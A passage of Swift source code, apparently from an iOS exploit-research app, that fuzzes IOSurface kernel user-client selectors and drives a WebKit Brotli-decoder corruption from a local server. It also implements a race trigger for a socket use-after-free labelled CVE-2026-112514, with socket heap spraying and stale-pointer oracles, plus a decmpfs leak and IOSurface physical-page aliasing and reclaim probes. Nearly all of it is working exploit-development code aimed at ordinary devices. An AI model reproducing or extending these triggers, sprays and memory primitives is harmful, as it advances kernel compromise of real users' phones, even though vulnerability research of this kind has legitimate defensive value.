                                   0x42475241,   // IOSurfacePixelFormat (ARGB)
                                   0x10000,      // IOSurfaceAllocSize
                                   0,            // IOSurfaceAddress
                                   0]
            var out = [UInt8](repeating: 0, count: 0xc68)
            var outSize: UInt64 = 0xc68
            let r: Int32 = words.withUnsafeMutableBufferPointer { wb in
                out.withUnsafeMutableBytes { ob in
                    callMethod(conn, 0x06, nil, 0, UnsafeRawPointer(wb.baseAddress!), 0x20,
                               ob.baseAddress, &outSize)
                }
            }
            let k = krN(r)
            hist3[k, default: 0] += 1
            if r == 0 {
                ok3.append("count=\(count) outSize=0x\(String(outSize, radix: 16)) head=\(out.prefix(16).map { String(format: "%02x", $0) }.joined())")
            }
        }
        emit("sel0x06 fast-path count sweep 0...64: " + hist3.map { "\($0.key)=\($0.value)" }.joined(separator: " "))
        for o in ok3 { emit("   0x06 OK " + o) }

        // ---- descriptor / memory-pool family -------------------------------
        // 0x1a reads:  x23 = [args+0x30] (struct in)   w25 = [args+0x38] (size)
        //              x0  = [args+0x40]  -> dereferenced as an object pointer
        //              x24 = [args+0x58] (struct out)   w27 = [args+0x60] (size)
        // The kext's own field names for this family are "Descriptor address",
        // "Pool Id", "Components" and per-component "Length"/"Options", so the
        // structure is  { u64 descriptorAddress; u32 poolId; u32 componentCount; ... }
        // and the component array is read through the user pointer.
        let descSels: [(UInt32, Int, Int)] = [(0x1a, 0, 0), (0x2e, 0, 0), (0x36, 0, 0),
                                            (0x13, 0, 0), (0x18, 0, 0),
                                            (0x2f, 1, 0), (0x30, 1, 0), (0x32, 2, 0)]
        let descPtr = UnsafeMutableRawPointer.allocate(byteCount: 0x4000, alignment: 16)
        descPtr.initializeMemory(as: UInt64.self, repeating: 0x0000000041414141, count: 0x800)
        let descAddr = UInt64(UInt(bitPattern: descPtr))
        var hist4: [String: Int] = [:]
        for (sel, nsc, _so) in descSels {
            for compCount in [UInt64(0), 1, 2, 8, 64, 1024] {
                for poolId in [UInt64(0), 1] {
                    var words: [UInt64] = [descAddr, poolId, compCount, 0, 0, 0, 0, 0,
                                           0x1000, 0, 0, 0, 0, 0, 0, 0]
                    var out = [UInt8](repeating: 0, count: 0x1000)
                    var outSize: UInt64 = 0x1000
                    var sc: [UInt64] = [UInt64](repeating: 0, count: max(nsc, 1))
                    let r: Int32 = sc.withUnsafeMutableBufferPointer { sb in
                        words.withUnsafeMutableBufferPointer { wb in
                            out.withUnsafeMutableBytes { ob in
                                callMethod(conn, sel, nsc > 0 ? UnsafePointer(sb.baseAddress) : nil,
                                           UInt32(nsc),
                                           UnsafeRawPointer(wb.baseAddress!), 0x80,
                                           ob.baseAddress, &outSize)
                            }
                        }
                    }
                    hist4["sel0x\(String(sel, radix: 16)) n=\(nsc) c=\(compCount) p=\(poolId): \(krN(r))"] = 1
                    if r == 0 {
                        emit("   0x\(String(sel, radix: 16)) OK n=\(nsc) comps=\(compCount) pool=\(poolId) outSize=0x\(String(outSize, radix: 16)) head=\(out.prefix(24).map { String(format: "%02x", $0) }.joined())")
                    }
                }
            }
        }
        for k in hist4.keys.sorted() { emit("   desc " + k) }
        emit("=== probe done ===")
        _ = xq_IOServiceClose(conn)
        status = "Complete"; isRunning = false
    }


    // ---- stage 1: make the WebKit networking process decode our bytes -------
    func runWebMode() async {
        isRunning = true; status = "Web probe..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        let target = webTarget.isEmpty ? "http://192.168.1.99:8777/brtest" : webTarget
        webProbeURL = target
        emit("loading \(target) in a WKWebView; the WebKit networking process decodes it")
        try? await Task.sleep(nanoseconds: 15_000_000_000)
        emit("web probe done")
        status = "Complete"; isRunning = false
    }

    // Called from the page's JS bridge.  The page fetches /brtest through the
    // WebKit networking daemon and streams the *decoded* body back, so the
    // response length is a direct, in-daemon oracle for the Brotli corruption:
    // a patched decoder yields ~5 KB, the vulnerable one runs away to MBs.
    func handleScan(_ s: String) {
        emit("JS " + s)
        if s.hasPrefix("DONE") { scanDone = true }
    }

    func runWebScanMode() async {
        isRunning = true; status = "Web scan..."; log = ""; scanDone = false
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        let base = webTarget.isEmpty ? "http://192.168.1.99:8777" : webTarget
        var target = base.hasSuffix("/page") ? base : base + "/page"
        target += "?t=\(Int(Date().timeIntervalSince1970))"
        emit("loading \(target); page streams decoded /brtest back")
        webProbeURL = target
        let deadline = Date().addingTimeInterval(45)
        while !scanDone && Date() < deadline {
            try? await Task.sleep(nanoseconds: 200_000_000)
        }
        emit(scanDone ? "webscan done" : "webscan timeout")
        status = "Complete"; isRunning = false
        webProbeURL = ""
    }

    // ---- the Metal half -----------------------------------------------------
    // ---- CVE-2026-112514 socket UAF race (ported from socket_uaf_trigger.c) ----
    final class SocketUafBox {
        var trigger = false
        var stop = false
    }

    // Shared race state. Plain Int32 words in heap memory so the worker
    // threads do not pay ARC / exclusivity costs while spinning.
    //   [0] fd   [1] phase (0 idle, 1 armed, 2 close-now, 3 closed)
    //   [2] stop [3] oddErr [4] postCloseOk [5] lastErrno [6] sends
    final class SockUafState {
        let p = UnsafeMutablePointer<Int32>.allocate(capacity: 24)
        init() { p.initialize(repeating: 0, count: 24) }
        deinit { p.deinitialize(count: 24); p.deallocate() }
        var fd: Int32 { get { p[0] } set { p[0] = newValue } }
        var phase: Int32 { get { p[1] } set { p[1] = newValue } }
        var stop: Int32 { get { p[2] } set { p[2] = newValue } }
        var odd: Int32 { get { p[3] } set { p[3] = newValue } }
        var postCloseOk: Int32 { get { p[4] } set { p[4] = newValue } }
        var lastErr: Int32 { get { p[5] } set { p[5] = newValue } }
        var sends: Int32 { get { p[6] } set { p[6] = newValue } }
        var uafProbe: Int32 { get { p[7] } set { p[7] = newValue } }
        var nwMax: Int32 { get { p[8] } set { p[8] = newValue } }
        var staleWrite: Int32 { get { p[9] } set { p[9] = newValue } }
        var staleRead: Int32 { get { p[10] } set { p[10] = newValue } }
        var mode: Int32 { get { p[11] } set { p[11] = newValue } }
        var gate: Int32 { get { p[12] } set { p[12] = newValue } }
        var done: Int32 { get { p[13] } set { p[13] = newValue } }
        var entered: Int32 { get { p[14] } set { p[14] = newValue } }
    }

    nonisolated func sockUafSenderLoop(_ st: SockUafState, _ buf: UnsafeMutablePointer<UInt8>, _ len: Int) {
        // 8 x 1 KiB iovecs: the pre-lock copyin/validation path is longer than a
        // bare send(), so more of the syscall is in-kernel when close lands.
        let seg = len / 8
        let iov = UnsafeMutablePointer<iovec>.allocate(capacity: 8)
        for k in 0..<8 {
            iov[k] = iovec(iov_base: UnsafeMutableRawPointer(buf + k * seg), iov_len: seg)
        }
        var msg = msghdr()
        msg.msg_iov = iov
        msg.msg_iovlen = 8
        var n: Int32 = 0
        while st.stop == 0 {
            if st.mode == 1 {
                if st.gate == 0 { usleep(20); continue }
                let pfd = st.fd
                if pfd >= 0 {
                    OSAtomicIncrement32Barrier(&st.p[14])
                    _ = sendmsg(pfd, &msg, MSG_DONTWAIT)
                    OSAtomicIncrement32Barrier(&st.p[13])
                }
                while st.gate != 0 && st.stop == 0 { usleep(5) }
                continue
            }
            if st.phase == 0 { usleep(50); continue }
            let fd = st.fd
            if fd < 0 { continue }
            n &+= 1
            if (n & 7) == 0 {
                _ = shutdown(fd, SHUT_RDWR)
            } else {
                let r = sendmsg(fd, &msg, MSG_DONTWAIT)
                OSAtomicIncrement32Barrier(&st.p[6])
                if r >= 0 {
                    if st.phase == 3 {
                        OSAtomicIncrement32Barrier(&st.p[4])
                        // Decisive oracle: if the descriptor is still free yet
                        // sendmsg() walked a live socket, the socket pointer was
                        // stale -> use-after-free window hit.
                        if fcntl(fd, F_GETFD) < 0 {
                            OSAtomicIncrement32Barrier(&st.p[7])
                            OSAtomicIncrement32Barrier(&st.p[9])   // stale WRITE path
                        }
                    }
                } else {
                    let e = errno
                    if st.phase == 3 {
                        if e != EBADF { OSAtomicIncrement32Barrier(&st.p[3]); st.lastErr = e }
                        if fcntl(fd, F_GETFD) < 0 && e != EBADF {
                            OSAtomicIncrement32Barrier(&st.p[7])
                            OSAtomicIncrement32Barrier(&st.p[10])  // stale read path
                        }
                    } else if e != EAGAIN && e != EBADF && e != EWOULDBLOCK && e != EINTR
                                && e != EPIPE && e != ENOTCONN && e != ECONNRESET
                                && e != ENOBUFS && e != EINVAL {
                        OSAtomicIncrement32Barrier(&st.p[3]); st.lastErr = e
                    }
                }
            }
        }
        iov.deallocate()
    }

    nonisolated func sockUafCloserLoop(_ st: SockUafState) {
        // Exactly one party wins 2 -> 3 and performs the close, so a target fd
        // number reused by the next iteration can never be closed twice.
        while st.stop == 0 {
            if st.phase == 2 {
                let fd = st.fd
                if fd >= 0 && OSAtomicCompareAndSwap32(2, 3, &st.p[1]) {
                    close(fd)
                }
            }
        }
    }

    nonisolated func sockUafMakeSocket(_ ip: String, _ port: Int) -> Int32 {
        let fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
        if fd < 0 { return -1 }
        var one: Int32 = 1
        let il = socklen_t(MemoryLayout<Int32>.size)
        setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &one, il)
        setsockopt(fd, IPPROTO_TCP, 0x100, &one, il)
        setsockopt(fd, IPPROTO_TCP, TCP_KEEPINTVL, &one, il)
        var three: Int32 = 3
        setsockopt(fd, IPPROTO_TCP, TCP_KEEPCNT, &three, il)
        setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, il)
        var bufsize: Int32 = 256 * 1024
        setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &bufsize, il)
        setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &bufsize, il)
        var lg = linger()
        lg.l_onoff = 1
        lg.l_linger = 0
        setsockopt(fd, SOL_SOCKET, SO_LINGER, &lg, socklen_t(MemoryLayout<linger>.size))
        var addr = sockaddr_in()
        addr.sin_family = sa_family_t(AF_INET)
        addr.sin_port = in_port_t(UInt16(port).bigEndian)
        inet_pton(AF_INET, ip, &addr.sin_addr)
        _ = withUnsafePointer(to: &addr) { p in
            p.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                connect(fd, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
            }
        }
        _ = fcntl(fd, F_SETFL, O_NONBLOCK)
        return fd
    }

    nonisolated func sockUafSpray(_ n: Int) -> [Int32] {
        var fds: [Int32] = []
        for _ in 0..<n {
            let fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            if fd < 0 { break }
            var v = Int32(bitPattern: 0xdeadbeef)
            setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &v, socklen_t(MemoryLayout<Int32>.size))
            fds.append(fd)
        }
        return fds
    }

    // Connected spray: sockets are freshly connected to the precision listener,
    // never sent on, so any byte their peer receives proves a stale sender
    // delivered into a reallocated socket.
    nonisolated func sockUafSprayConnected(_ n: Int, _ port: Int) -> [Int32] {
        var fds: [Int32] = []
        var addr = sockaddr_in()
        addr.sin_family = sa_family_t(AF_INET)
        addr.sin_port = in_port_t(UInt16(port).bigEndian)
        inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr)
        for _ in 0..<n {
            let fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            if fd < 0 { break }
            _ = withUnsafePointer(to: &addr) { q in
                q.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
                    connect(fd, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
                }
            }
            fds.append(fd)
        }
        return fds
    }


    // Discriminating experiment for type isolation: if socket allocations come from a
    // dedicated/type-isolated region, freeing a large socket population frees nothing
    // that out-of-line kalloc_data can use, and the footprint cost of a spray is the
    // same whether or not we first freed sockets. If the memory is shared, the spray
    // reuses the freed socket pages and costs noticeably less.
    nonisolated func sockUafZoneProbe() {
        func footprint() -> UInt64 {
            var vmi = task_vm_info_data_t()
            var vmc = mach_msg_type_number_t(MemoryLayout<task_vm_info_data_t>.size / MemoryLayout<natural_t>.size)
            var foot: UInt64 = 0
            let kr = withUnsafeMutablePointer(to: &vmi) { q in
                q.withMemoryRebound(to: integer_t.self, capacity: Int(vmc)) { ip in
                    task_info(mach_task_self(), task_flavor_t(TASK_VM_INFO), ip, &vmc)
                }
            }
            if kr == KERN_SUCCESS { foot = vmi.phys_footprint }
            return foot / 1024
        }
        func spray(_ bytes: Int, _ count: Int) -> Int {
            sockuaf_ool_reset()
            let n = Int(sockuaf_ool_spray(bytes, Int32(count), 0x41))
            usleep(300_000)
            return n
        }
        emitBg("[*] zoneprobe start: footprint \(footprint()) KB")

        // Arm A - control: spray with no socket population.
        let a0 = footprint()
        let aN = spray(832, 8192)
        let a1 = footprint()
        emitBg("[*] zoneprobe arm A (no sockets freed): sprayed \(aN)x832, footprint \(a0) -> \(a1) KB (delta \(a1 &- a0))")

        // Hold a large socket population, then free it wholesale.
        var rl = rlimit()
        if getrlimit(RLIMIT_NOFILE, &rl) == 0 {
            rl.rlim_cur = min(rlim_t(4096), rl.rlim_max)
            setrlimit(RLIMIT_NOFILE, &rl)
        }
        var fds: [Int32] = []
        for _ in 0..<2048 {
            let f = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            if f < 0 { break }
            fds.append(f)
        }
        let held = fds.count
        let b0 = footprint()
        for f in fds { close(f) }
        fds.removeAll()
        usleep(500_000)          // allow zone GC / page return
        let b1 = footprint()
        emitBg("[*] zoneprobe held+freed \(held) sockets: footprint \(b0) -> \(b1) KB (reclaimed \(b0 &- b1))")

        // Arm B - same spray immediately after the wholesale free.
        let b2 = footprint()
        let bN = spray(832, 8192)
        let b3 = footprint()
        emitBg("[*] zoneprobe arm B (after socket free): sprayed \(bN)x832, footprint \(b2) -> \(b3) KB (delta \(b3 &- b2))")
        emitBg("[*] zoneprobe verdict: control delta \(a1 &- a0) KB, post-free delta \(b3 &- b2) KB")
    }

    // Peer-delivery observer shared by the reclaim variants: connect a batch of probe
    // sockets whose peers are already accepted, send nothing on them, then drain the
    // peers. Any byte that arrives is stale-sender data landing in a socket rather than
    // in attacker-controlled memory. Must be called while the senders may still be
    // finishing, i.e. before waiting for st.done to reach n.
    nonisolated func cowProbe() {
        emitBg("[*] cowprobe start (CoW / external-object fault storm)")
        var st = [Int32](repeating: 0, count: 6)
        let kr = cow_probe_run(256, 64, &st)
        emitBg("[*] cowprobe: make=\(st[0]) map1=\(st[1]) map2=\(st[2]) alloc=\(st[3]) copy=\(st[4]) thread=\(st[5]) firstKR=\(kr)")
        emitBg("=== cowprobe done ===")
    }

    nonisolated func cowFileProbe() {
        emitBg("[*] cowfile start (file-backed MAP_PRIVATE CoW storm)")
        let dir = NSTemporaryDirectory()
        var st = [Int32](repeating: 0, count: 4)
        let err = cow_file_probe(256, 64, dir, &st)
        emitBg("[*] cowfile: open=\(st[0]) mappriv=\(st[1]) mapshr=\(st[2]) thread=\(st[3]) err=\(err)")
        emitBg("=== cowfile done ===")
    }

    nonisolated func apfsRaceProbe() {
        emitBg("[*] apfsrace start (APFS msync/invalidate stress)")
        let dir = NSTemporaryDirectory()
        var st = [Int32](repeating: 0, count: 3)
        apfs_race_probe(96, 4096, dir, &st)
        emitBg("[*] apfsrace: open=\(st[0]) mmap=\(st[1]) thread=\(st[2])")
        emitBg("=== apfsrace done ===")
    }

    nonisolated func runDecmpfsMode() {
        emitBg("[*] decmpfs start (AppleFSCompressionTypeZlib staged probe / CVE-2026-113910)")
        let dir = NSTemporaryDirectory()
        run_decmpfs_leak(dir)
        emitBg("=== decmpfs done ===")
    }

    nonisolated func runANEMode() {
        let args = ProcessInfo.processInfo.arguments
        let trigger = args.contains("--anetrigger")
        emitBg("[*] ane start (ANE user-client reachability; trigger=\(trigger))")
        let opened = ane_probe(trigger ? 1 : 0)
        emitBg("=== ane done: opened=\(opened) trigger=\(trigger) ===")
    }

    // ---- external-object / physical-primitive gate -------------------------
    nonisolated func runMemEntryMode() {
        emitBg("[*] mementry start (mach_make_memory_entry_64 over our own mapping)")
        var st = [Int32](repeating: 0, count: 8)
        let rc = mem_entry_probe(&st)
        emitBg(String(format: "[*] mementry rc=%d alloc=%d entry=%d alias=%d samePage=%d",
                      rc, st[1], st[2], st[3], st[4]))
        memAliasProbe()
        emitBg("=== mementry done ===")
    }

    /// Second, independent path: `mach_vm_map` (declared via @_silgen_name).
    /// The classic `vm_map` used above is what the SDK documents for C clients;
    /// if it is refused while this one succeeds, the difference is in the API,
    /// not in the sandbox policy.
    nonisolated func memAliasProbe() {
        let sz = mach_vm_size_t(0x10000)
        let buf = UnsafeMutableRawPointer.allocate(byteCount: Int(sz), alignment: 0x4000)
        defer { buf.deallocate() }
        buf.storeBytes(of: 0xC0FFEE27, as: UInt32.self)

        let baseAddr = mach_vm_address_t(UInt(bitPattern: buf))
        var esz = sz
        var entry: mach_port_t = 0
        var kr = cv_make_memory_entry_64(mach_task_self_, &esz, baseAddr,
                                         vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
                                         &entry, 0)
        emitBg("[*] memalias make_memory_entry_64 -> \(kr) handle=0x\(String(entry, radix: 16)) size=0x\(String(esz, radix: 16))")
        guard kr == KERN_SUCCESS, entry != 0 else { return }
        defer { mach_port_deallocate(mach_task_self_, entry) }

        // First mapping: wherever the kernel chooses.
        var alias: mach_vm_address_t = 0
        kr = cv_mach_vm_map(mach_task_self_, &alias, sz, 0, Int32(VM_FLAGS_ANYWHERE),
                            entry, 0, boolean_t(0),
                            vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
                            vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
                            VM_INHERIT_NONE)
        emitBg("[*] memalias mach_vm_map(ANYWHERE) -> \(kr) at 0x\(String(alias, radix: 16))")

        // Second mapping: forced far away, so a distinct-VA round trip proves the
        // two mappings name the same physical pages rather than the same mapping.
        let want = baseAddr + 0x40000000
        var hint = want
        let krFixed = cv_mach_vm_map(mach_task_self_, &hint, sz, 0, Int32(VM_FLAGS_FIXED),
                                     entry, 0, boolean_t(0),
                                     vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
                                     vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
                                     VM_INHERIT_NONE)
        emitBg("[*] memalias mach_vm_map(FIXED 0x\(String(want, radix: 16))) -> \(krFixed) at 0x\(String(hint, radix: 16))")
        guard krFixed == KERN_SUCCESS, hint != 0,
              let aptr = UnsafeMutableRawPointer(bitPattern: UInt(hint)) else { return }
        defer { vm_deallocate(mach_task_self_, vm_address_t(hint), vm_size_t(sz)) }

        let bm = buf.load(as: UInt32.self)
        let am = aptr.load(as: UInt32.self)
        emitBg(String(format: "[*] memalias marker base=0x%08x aliasAnywhere=0x%08x aliasFixed=0x%08x samePage=%@",
                      bm, alias, am, am == 0xC0FFEE27 ? "YES" : "no"))
    }

    // ---- IOSurface-backed external-object gate ------------------------------
    // `--mementry` proved an unsigned app can make a memory entry over its own
    // writable pages and alias them at a chosen VA (distinct VA, same physical
    // page). That only wraps memory we already own. This asks whether the same
    // construction wraps *kernel/GPU-owned* pages: create an IOSurface in the
    // "PurpleGfxMem" region, make a memory entry over its base, and map that
    // object a second time at an address we choose.
    //
    // Stages (each logged separately so a refusal is attributable):
    //   A/C  create two surfaces - one GPU-region, one control - and record bases
    //   1    write distinct markers through each surface's own mapping
    //   2    memory entry over surface A's base at its exact alloc size -> kr
    //   3    mach_vm_map that object FIXED at a reserved VA -> read-back
    //   4    oversize memory entry (8x alloc) -> kr; if it succeeds, read across
    //        the delta between A and C to test whether the entry wraps
    //        neighbouring allocations
    nonisolated func runIOSurfPhysMode() {
        emitBg("[*] iosurfphys start: memory entry over an IOSurface base + distinct-VA alias")
        let page = mach_vm_size_t(vm_page_size)

        let common: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 2,
            .pixelFormat: kCVPixelFormatType_32BGRA,
            .bytesPerElement: 4, .bytesPerRow: 256,
            .allocSize: Int(page * 2),
        ]
        var regionProps = common
        regionProps[IOSurfacePropertyKey(rawValue: "IOSurfaceMemoryRegion")] = "PurpleGfxMem"

        guard let surfA = IOSurfaceCreate(regionProps as CFDictionary) else {
            emitBg("[-] iosurfphys: PurpleGfxMem surface refused (stage A)")
            emitBg("=== iosurfphys done ===")
            return
        }
        let baseA = UInt(bitPattern: IOSurfaceGetBaseAddress(surfA))
        let allocA = IOSurfaceGetAllocSize(surfA)
        emitBg(String(format: "[*] iosurfphys A(PurpleGfxMem) id=%u base=0x%llx alloc=0x%llx",
                      IOSurfaceGetID(surfA), baseA, allocA))

        guard let surfC = IOSurfaceCreate(common as CFDictionary) else {
            emitBg("[-] iosurfphys: control surface refused (stage C)")
            emitBg("=== iosurfphys done ===")
            return
        }
        let baseC = UInt(bitPattern: IOSurfaceGetBaseAddress(surfC))
        let allocC = IOSurfaceGetAllocSize(surfC)
        emitBg(String(format: "[*] iosurfphys C(control)      id=%u base=0x%llx alloc=0x%llx",
                      IOSurfaceGetID(surfC), baseC, allocC))
        emitBg(String(format: "[*] iosurfphys |delta(A-C)| = 0x%llx (C is %@ A)",
                              UInt64(abs(Int64(baseA) - Int64(baseC))),
                              (Int64(baseC) - Int64(baseA)) >= 0 ? "above" : "below"))

        // stage 1 - markers through each surface's own mapping
        let srcA = UnsafeMutableRawPointer(bitPattern: baseA)
        let srcC = UnsafeMutableRawPointer(bitPattern: baseC)
        srcA?.storeBytes(of: UInt32(0xAAAA0001), as: UInt32.self)
        srcC?.storeBytes(of: UInt32(0xBBBB0002), as: UInt32.self)
        emitBg(String(format: "[*] iosurfphys stage1 marker A=0x%08x (read back 0x%08x) C=0x%08x (read back 0x%08x)",
                      UInt32(0xAAAA0001), srcA?.load(as: UInt32.self) ?? 0,
                      UInt32(0xBBBB0002), srcC?.load(as: UInt32.self) ?? 0))

        // stage 2+3 - entry over A's base, then a FIXED alias of the object
        var esz = mach_vm_size_t(allocA)
        var entry: mach_port_t = 0
        let krEntry = cv_make_memory_entry_64(mach_task_self_, &esz, mach_vm_offset_t(baseA),
                                              vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
                                              &entry, 0)
        emitBg(String(format: "[*] iosurfphys stage2 make_memory_entry_64(size=0x%llx) -> kr=%d (0x%x) handle=0x%x",
                      esz, krEntry, krEntry, entry))
        defer { if entry != 0 { mach_port_deallocate(mach_task_self_, entry) } }

        if krEntry == KERN_SUCCESS && entry != 0 {
            // reserve an address of our choosing, release it, then FIXED-map there
            var slot: vm_address_t = 0
            let skr = vm_allocate(mach_task_self_, &slot, vm_size_t(allocA), VM_FLAGS_ANYWHERE)
            emitBg(String(format: "[*] iosurfphys stage3 reserve -> kr=%d (0x%x) slot=0x%llx",
                          skr, skr, UInt64(slot)))
            if skr == KERN_SUCCESS && slot != 0 {
                vm_deallocate(mach_task_self_, slot, vm_size_t(allocA))
            } else {
                slot = 0
            }

            var addr = mach_vm_address_t(slot)
            var fkr = cv_mach_vm_map(mach_task_self_, &addr, mach_vm_size_t(allocA), 0,
                                     Int32(VM_FLAGS_FIXED), entry, 0, boolean_t(0),
                                     vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
                                     vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
                                     VM_INHERIT_NONE)
            let fixedKR = fkr
            if fkr != KERN_SUCCESS {
                addr = 0
                fkr = cv_mach_vm_map(mach_task_self_, &addr, mach_vm_size_t(allocA), 0,
                                     Int32(VM_FLAGS_ANYWHERE), entry, 0, boolean_t(0),
                                     vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
                                     vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
                                     VM_INHERIT_NONE)
                emitBg(String(format: "[*] iosurfphys stage3 FIXED -> kr=%d (0x%x); ANYWHERE fallback -> kr=%d",
                              fixedKR, fixedKR, fkr))
            }
            emitBg(String(format: "[*] iosurfphys stage3 mach_vm_map -> kr=%d (0x%x) at 0x%llx",
                          fkr, fkr, addr))
            if fkr == KERN_SUCCESS && addr != 0, let ap = UnsafeMutableRawPointer(bitPattern: UInt(addr)) {
                let mSrc = srcA?.load(as: UInt32.self) ?? 0
                let mAlias = ap.load(as: UInt32.self)
                emitBg(String(format: "[*] iosurfphys stage3 marker source=0x%08x aliasFixed=0x%08x samePhysicalPage=%@",
                              mSrc, mAlias, mAlias == mSrc && mSrc != 0 ? "YES" : "no"))
                vm_deallocate(mach_task_self_, vm_address_t(addr), vm_size_t(allocA))
            }
        }

        // stage 4 - oversize entry over the same base; does it wrap neighbours?
        // NOTE: the kernel may clamp the requested size to the VM object's real
        // extent, so every read below is bounds-checked against the size the
        // call actually returned.
        let requested = mach_vm_size_t(allocA * 8)
        var bsz = requested
        var bEntry: mach_port_t = 0
        let krBig = cv_make_memory_entry_64(mach_task_self_, &bsz, mach_vm_offset_t(baseA),
                                            vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
                                            &bEntry, 0)
        emitBg(String(format: "[*] iosurfphys stage4 make_memory_entry_64(requested=0x%llx) -> kr=%d (0x%x) handle=0x%x returned=0x%llx clamped=%@",
                      requested, krBig, krBig, bEntry, bsz,
                      bsz != requested ? "YES" : "no"))
        defer { if bEntry != 0 { mach_port_deallocate(mach_task_self_, bEntry) } }

        if krBig == KERN_SUCCESS && bEntry != 0 {
            var bAddr: mach_vm_address_t = 0
            let bkr = cv_mach_vm_map(mach_task_self_, &bAddr, bsz, 0, Int32(VM_FLAGS_ANYWHERE),
                                     bEntry, 0, boolean_t(0),
                                     vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
                                     vm_prot_t(VM_PROT_READ | VM_PROT_WRITE),
                                     VM_INHERIT_NONE)
            emitBg(String(format: "[*] iosurfphys stage4 mach_vm_map -> kr=%d (0x%x) at 0x%llx",
                          bkr, bkr, bAddr))
            if bkr == KERN_SUCCESS && bAddr != 0, let bp = UnsafeMutableRawPointer(bitPattern: UInt(bAddr)) {
                let w0 = bp.load(as: UInt32.self)
                var off1 = "n/a (beyond mapping)"
                if UInt64(allocA) + 4 <= bsz {
                    off1 = String(format: "0x%08x", bp.advanced(by: Int(allocA)).load(as: UInt32.self))
                }
                let delta = Int64(baseC) - Int64(baseA)
                var cross = "n/a (|delta| beyond mapping)"
                if llabs(delta) + 4 <= Int64(bsz) {
                    cross = String(format: "offset delta -> 0x%08x",
                                   bp.advanced(by: Int(delta)).load(as: UInt32.self))
                }
                emitBg(String(format: "[*] iosurfphys stage4 oversize alias: off0=0x%08x off1alloc=%@ %@",
                              w0, off1, cross))
                vm_deallocate(mach_task_self_, vm_address_t(bAddr), vm_size_t(bsz))
            }
        }

        // stage 5 - prefetch on the GPU-region surface
        let pk = cv_IOSurfacePrefetchPages(surfA)
        emitBg(String(format: "[*] iosurfphys stage5 IOSurfacePrefetchPages(A) -> kr=%d (0x%x)", pk, pk))
        emitBg("=== iosurfphys done ===")
    }

    /// Stale-page variant: keep only the memory object (no user mapping), destroy
    /// the surface, spray fresh surfaces, then map the entry again and read.
    nonisolated func runIOSurfRaceMode() {
        emitBg("[*] iosurfrace start (entry over a surface; alias dropped before release)")
        var st = [Int32](repeating: 0, count: 8)
        let rc = iosurf_race_probe(&st)
        emitBg(String(format: "[*] iosurfrace rc=%d recycleCtl=%d markerWrote=%d entryKR=%d alias1=%d baseReused=%d verdict=%d",
                      rc, st[0], st[1], st[2], st[3], st[4], st[5]))
        emitBg("=== iosurfrace done ===")
    }

    // ---- IOSurface freed-page reclaim-type expansion -----------------------
    //
    // `--iosurfrace` showed a surviving memory entry follows a destroyed
    // surface's physical pages into a NEW IOSurface. This mode asks whether
    // an allocation that is NOT an IOSurface can take those pages instead:
    // for each (surface kind, reclaimer kind) pair it releases a wrapped
    // surface and then sprays vm_allocate / mmap / malloc / file-mmap /
    // IOSurface blocks carrying unique tags, re-maps the stale entry and
    // scans the whole object for a tag.

    nonisolated func runIOSurfReclaimMode() {
        emitBg("[*] iosurfreclaim start (cross-type page reclaim sweep)")
        var st = [Int32](repeating: 0, count: 32)
        let dir = NSTemporaryDirectory()
        let rc = iosurf_reclaim_probe(dir, &st)
        var hits = 0
        for i in 0..<32 { if st[i] != 0 { hits += 1 } }
        emitBg(String(format: "[*] iosurfreclaim rc=%d hits=%d", rc, hits))
        emitBg("=== iosurfreclaim done ===")
    }

    // ---- IOSurface freed-page watch ------------------------------------------
    //
    // `--iosurfreclaim` sprayed app-reachable reclaimers *after* the release and
    // found none that took the pages. The untested case is a kernel-internal
    // reclaimer acting during the window. This mode keeps the carveout window
    // open, drives heavy kernel churn (sockets / pipes / VM / files / mach ports /
    // plain IOSurfaces) and watches the stale memory entry word-by-word for ANY
    // content change - no tag or reclaimer type has to be assumed.
    // Round 0 is an in-run positive control: fresh PurpleGfxMem surfaces are
    // created right after the release and are expected to overwrite the markers.

    nonisolated func runIOSurfWatchMode() {
        emitBg("[*] iosurfwatch start (watch a released region surface's pages under kernel churn)")
        var st = [Int32](repeating: 0, count: 64)
        let dir = NSTemporaryDirectory()

        if let dev = MTLCreateSystemDefaultDevice() {
            gMetalChurnDevice = dev
            hold_set_callback(gMetalChurnCallback)
            emitBg("[*] iosurfwatch metal churn enabled: \(dev.name)")
        } else {
            emitBg("[-] iosurfwatch no Metal device; kernel churn only")
        }
        let rc = iosurf_hold_probe(dir, 4, &st)
        var worst = 0
        var ctrl = 0
        for i in 0..<64 {
            if i == 0 { ctrl = Int(st[i]) } else if st[i] > Int32(worst) { worst = Int(st[i]) }
        }
        emitBg(String(format: "[*] iosurfwatch rc=%d controlWorst=%d testWorst=%d", rc, ctrl, worst))
        emitBg("=== iosurfwatch done ===")
    }

    // ---- IOSurface notify lifetime probe (private connection) ----------------
    //
    // `--ionotify` drives selector 0x11/0x12 directly on an app-opened
    // IOSurfaceRootUserClient, so the notifier client is owned by this process
